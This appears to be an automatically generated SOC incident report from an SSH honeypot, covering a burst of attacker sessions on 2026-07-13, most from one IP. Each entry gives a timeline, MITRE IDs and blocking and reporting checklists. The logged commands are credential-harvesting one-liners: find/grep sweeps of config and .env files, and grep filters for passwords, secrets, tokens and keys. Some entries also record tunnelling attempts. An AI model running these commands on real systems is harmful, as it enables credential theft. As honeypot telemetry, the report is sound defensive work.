**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:15` | `cowrie.session.connect` |
| `2026-07-13 12:37:17` | `cowrie.client.version` |
| `2026-07-13 12:37:17` | `cowrie.client.kex` |
| `2026-07-13 12:37:20` | `cowrie.login.success` |
| `2026-07-13 12:37:22` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.75.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `222.75.225[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa2aafe384d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'auth' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:16` | `cowrie.session.connect` |
| `2026-07-13 12:37:16` | `cowrie.client.version` |
| `2026-07-13 12:37:17` | `cowrie.client.kex` |
| `2026-07-13 12:37:18` | `cowrie.login.success` |
| `2026-07-13 12:37:19` | `cowrie.client.var` |
| `2026-07-13 12:37:19` | `cowrie.client.var` |
| `2026-07-13 12:37:19` | `cowrie.session.params` |
| `2026-07-13 12:37:19` | `cowrie.command.input` |
| `2026-07-13 12:37:19` | `cowrie.log.closed` |
| `2026-07-13 12:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-599445659713

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:20` | `cowrie.session.connect` |
| `2026-07-13 12:37:20` | `cowrie.client.version` |
| `2026-07-13 12:37:20` | `cowrie.client.kex` |
| `2026-07-13 12:37:21` | `cowrie.login.success` |
| `2026-07-13 12:37:22` | `cowrie.client.var` |
| `2026-07-13 12:37:22` | `cowrie.client.var` |
| `2026-07-13 12:37:23` | `cowrie.session.params` |
| `2026-07-13 12:37:23` | `cowrie.command.input` |
| `2026-07-13 12:37:23` | `cowrie.log.closed` |
| `2026-07-13 12:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f262328e774

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:23` | `cowrie.session.connect` |
| `2026-07-13 12:37:23` | `cowrie.client.version` |
| `2026-07-13 12:37:23` | `cowrie.client.kex` |
| `2026-07-13 12:37:25` | `cowrie.login.success` |
| `2026-07-13 12:37:25` | `cowrie.client.var` |
| `2026-07-13 12:37:25` | `cowrie.client.var` |
| `2026-07-13 12:37:26` | `cowrie.session.params` |
| `2026-07-13 12:37:26` | `cowrie.command.input` |
| `2026-07-13 12:37:26` | `cowrie.log.closed` |
| `2026-07-13 12:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9193c0f57e95

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:26` | `cowrie.session.connect` |
| `2026-07-13 12:37:26` | `cowrie.client.version` |
| `2026-07-13 12:37:26` | `cowrie.client.kex` |
| `2026-07-13 12:37:28` | `cowrie.login.success` |
| `2026-07-13 12:37:28` | `cowrie.client.var` |
| `2026-07-13 12:37:28` | `cowrie.client.var` |
| `2026-07-13 12:37:29` | `cowrie.session.params` |
| `2026-07-13 12:37:29` | `cowrie.command.input` |
| `2026-07-13 12:37:29` | `cowrie.log.closed` |
| `2026-07-13 12:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ed395ffd00

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:27` | `cowrie.session.connect` |
| `2026-07-13 12:37:28` | `cowrie.client.version` |
| `2026-07-13 12:37:28` | `cowrie.client.kex` |
| `2026-07-13 12:37:30` | `cowrie.login.success` |
| `2026-07-13 12:37:31` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b7e5b359e5

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:29` | `cowrie.session.connect` |
| `2026-07-13 12:37:29` | `cowrie.client.version` |
| `2026-07-13 12:37:30` | `cowrie.client.kex` |
| `2026-07-13 12:37:31` | `cowrie.login.success` |
| `2026-07-13 12:37:31` | `cowrie.client.var` |
| `2026-07-13 12:37:31` | `cowrie.client.var` |
| `2026-07-13 12:37:32` | `cowrie.session.params` |
| `2026-07-13 12:37:32` | `cowrie.command.input` |
| `2026-07-13 12:37:32` | `cowrie.log.closed` |
| `2026-07-13 12:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0321b9bf8461

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:32` | `cowrie.session.connect` |
| `2026-07-13 12:37:32` | `cowrie.client.version` |
| `2026-07-13 12:37:33` | `cowrie.client.kex` |
| `2026-07-13 12:37:34` | `cowrie.login.success` |
| `2026-07-13 12:37:35` | `cowrie.client.var` |
| `2026-07-13 12:37:35` | `cowrie.client.var` |
| `2026-07-13 12:37:35` | `cowrie.session.params` |
| `2026-07-13 12:37:35` | `cowrie.command.input` |
| `2026-07-13 12:37:35` | `cowrie.log.closed` |
| `2026-07-13 12:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77ead0f3075

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:36` | `cowrie.session.connect` |
| `2026-07-13 12:37:36` | `cowrie.client.version` |
| `2026-07-13 12:37:36` | `cowrie.client.kex` |
| `2026-07-13 12:37:37` | `cowrie.login.success` |
| `2026-07-13 12:37:38` | `cowrie.client.var` |
| `2026-07-13 12:37:38` | `cowrie.client.var` |
| `2026-07-13 12:37:38` | `cowrie.session.params` |
| `2026-07-13 12:37:38` | `cowrie.command.input` |
| `2026-07-13 12:37:38` | `cowrie.log.closed` |
| `2026-07-13 12:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd81db295582

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'auth|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:39` | `cowrie.session.connect` |
| `2026-07-13 12:37:39` | `cowrie.client.version` |
| `2026-07-13 12:37:39` | `cowrie.client.kex` |
| `2026-07-13 12:37:40` | `cowrie.login.success` |
| `2026-07-13 12:37:41` | `cowrie.client.var` |
| `2026-07-13 12:37:41` | `cowrie.client.var` |
| `2026-07-13 12:37:41` | `cowrie.session.params` |
| `2026-07-13 12:37:41` | `cowrie.command.input` |
| `2026-07-13 12:37:41` | `cowrie.log.closed` |
| `2026-07-13 12:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f7f37ec6dc5

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'credential' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:42` | `cowrie.session.connect` |
| `2026-07-13 12:37:42` | `cowrie.client.version` |
| `2026-07-13 12:37:42` | `cowrie.client.kex` |
| `2026-07-13 12:37:43` | `cowrie.login.success` |
| `2026-07-13 12:37:44` | `cowrie.client.var` |
| `2026-07-13 12:37:44` | `cowrie.client.var` |
| `2026-07-13 12:37:44` | `cowrie.session.params` |
| `2026-07-13 12:37:44` | `cowrie.command.input` |
| `2026-07-13 12:37:44` | `cowrie.log.closed` |
| `2026-07-13 12:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa2a7ea4dc5

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:45` | `cowrie.session.connect` |
| `2026-07-13 12:37:45` | `cowrie.client.version` |
| `2026-07-13 12:37:45` | `cowrie.client.kex` |
| `2026-07-13 12:37:47` | `cowrie.login.success` |
| `2026-07-13 12:37:47` | `cowrie.client.var` |
| `2026-07-13 12:37:47` | `cowrie.client.var` |
| `2026-07-13 12:37:48` | `cowrie.session.params` |
| `2026-07-13 12:37:48` | `cowrie.command.input` |
| `2026-07-13 12:37:48` | `cowrie.log.closed` |
| `2026-07-13 12:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c88affeee07

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:48` | `cowrie.session.connect` |
| `2026-07-13 12:37:48` | `cowrie.client.version` |
| `2026-07-13 12:37:49` | `cowrie.client.kex` |
| `2026-07-13 12:37:50` | `cowrie.login.success` |
| `2026-07-13 12:37:51` | `cowrie.client.var` |
| `2026-07-13 12:37:51` | `cowrie.client.var` |
| `2026-07-13 12:37:51` | `cowrie.session.params` |
| `2026-07-13 12:37:51` | `cowrie.command.input` |
| `2026-07-13 12:37:51` | `cowrie.log.closed` |
| `2026-07-13 12:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4194bac50b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:52` | `cowrie.session.connect` |
| `2026-07-13 12:37:52` | `cowrie.client.version` |
| `2026-07-13 12:37:52` | `cowrie.client.kex` |
| `2026-07-13 12:37:53` | `cowrie.login.success` |
| `2026-07-13 12:37:54` | `cowrie.client.var` |
| `2026-07-13 12:37:54` | `cowrie.client.var` |
| `2026-07-13 12:37:54` | `cowrie.session.params` |
| `2026-07-13 12:37:54` | `cowrie.command.input` |
| `2026-07-13 12:37:54` | `cowrie.log.closed` |
| `2026-07-13 12:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-909296f0e63c

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:55` | `cowrie.session.connect` |
| `2026-07-13 12:37:55` | `cowrie.client.version` |
| `2026-07-13 12:37:55` | `cowrie.client.kex` |
| `2026-07-13 12:37:56` | `cowrie.login.success` |
| `2026-07-13 12:37:57` | `cowrie.client.var` |
| `2026-07-13 12:37:57` | `cowrie.client.var` |
| `2026-07-13 12:37:58` | `cowrie.session.params` |
| `2026-07-13 12:37:58` | `cowrie.command.input` |
| `2026-07-13 12:37:58` | `cowrie.log.closed` |
| `2026-07-13 12:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c1aca70ac5

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:37 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:37:58` | `cowrie.session.connect` |
| `2026-07-13 12:37:58` | `cowrie.client.version` |
| `2026-07-13 12:37:58` | `cowrie.client.kex` |
| `2026-07-13 12:38:00` | `cowrie.login.success` |
| `2026-07-13 12:38:00` | `cowrie.client.var` |
| `2026-07-13 12:38:00` | `cowrie.client.var` |
| `2026-07-13 12:38:01` | `cowrie.session.params` |
| `2026-07-13 12:38:01` | `cowrie.command.input` |
| `2026-07-13 12:38:01` | `cowrie.log.closed` |
| `2026-07-13 12:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f49d2845f7b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:01` | `cowrie.session.connect` |
| `2026-07-13 12:38:01` | `cowrie.client.version` |
| `2026-07-13 12:38:01` | `cowrie.client.kex` |
| `2026-07-13 12:38:03` | `cowrie.login.success` |
| `2026-07-13 12:38:03` | `cowrie.client.var` |
| `2026-07-13 12:38:03` | `cowrie.client.var` |
| `2026-07-13 12:38:04` | `cowrie.session.params` |
| `2026-07-13 12:38:04` | `cowrie.command.input` |
| `2026-07-13 12:38:04` | `cowrie.log.closed` |
| `2026-07-13 12:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783fba3ee371

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'credential|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:05` | `cowrie.session.connect` |
| `2026-07-13 12:38:05` | `cowrie.client.version` |
| `2026-07-13 12:38:05` | `cowrie.client.kex` |
| `2026-07-13 12:38:06` | `cowrie.login.success` |
| `2026-07-13 12:38:07` | `cowrie.client.var` |
| `2026-07-13 12:38:07` | `cowrie.client.var` |
| `2026-07-13 12:38:07` | `cowrie.session.params` |
| `2026-07-13 12:38:07` | `cowrie.command.input` |
| `2026-07-13 12:38:07` | `cowrie.log.closed` |
| `2026-07-13 12:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c35b8936bf

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'login' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:08` | `cowrie.session.connect` |
| `2026-07-13 12:38:08` | `cowrie.client.version` |
| `2026-07-13 12:38:08` | `cowrie.client.kex` |
| `2026-07-13 12:38:09` | `cowrie.login.success` |
| `2026-07-13 12:38:10` | `cowrie.client.var` |
| `2026-07-13 12:38:10` | `cowrie.client.var` |
| `2026-07-13 12:38:11` | `cowrie.session.params` |
| `2026-07-13 12:38:11` | `cowrie.command.input` |
| `2026-07-13 12:38:11` | `cowrie.log.closed` |
| `2026-07-13 12:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5791c7ed1b91

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:11` | `cowrie.session.connect` |
| `2026-07-13 12:38:11` | `cowrie.client.version` |
| `2026-07-13 12:38:11` | `cowrie.client.kex` |
| `2026-07-13 12:38:13` | `cowrie.login.success` |
| `2026-07-13 12:38:13` | `cowrie.client.var` |
| `2026-07-13 12:38:13` | `cowrie.client.var` |
| `2026-07-13 12:38:14` | `cowrie.session.params` |
| `2026-07-13 12:38:14` | `cowrie.command.input` |
| `2026-07-13 12:38:14` | `cowrie.log.closed` |
| `2026-07-13 12:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd1de237871

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:14` | `cowrie.session.connect` |
| `2026-07-13 12:38:14` | `cowrie.client.version` |
| `2026-07-13 12:38:15` | `cowrie.client.kex` |
| `2026-07-13 12:38:16` | `cowrie.login.success` |
| `2026-07-13 12:38:16` | `cowrie.client.var` |
| `2026-07-13 12:38:16` | `cowrie.client.var` |
| `2026-07-13 12:38:17` | `cowrie.session.params` |
| `2026-07-13 12:38:17` | `cowrie.command.input` |
| `2026-07-13 12:38:17` | `cowrie.log.closed` |
| `2026-07-13 12:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1acdd1f30632

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:38:17` | `cowrie.session.connect` |
| `2026-07-13 12:38:17` | `cowrie.client.version` |
| `2026-07-13 12:38:18` | `cowrie.client.kex` |
| `2026-07-13 12:38:19` | `cowrie.login.success` |
| `2026-07-13 12:38:19` | `cowrie.client.var` |
| `2026-07-13 12:38:19` | `cowrie.client.var` |
| `2026-07-13 12:38:20` | `cowrie.session.params` |
| `2026-07-13 12:38:20` | `cowrie.command.input` |
| `2026-07-13 12:38:20` | `cowrie.log.closed` |
| `2026-07-13 12:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6287d32d4457

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:38 |
| **Last Seen** | 2026-07-13 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'login|pass|user|secret|token|key|auth' | head -20` |
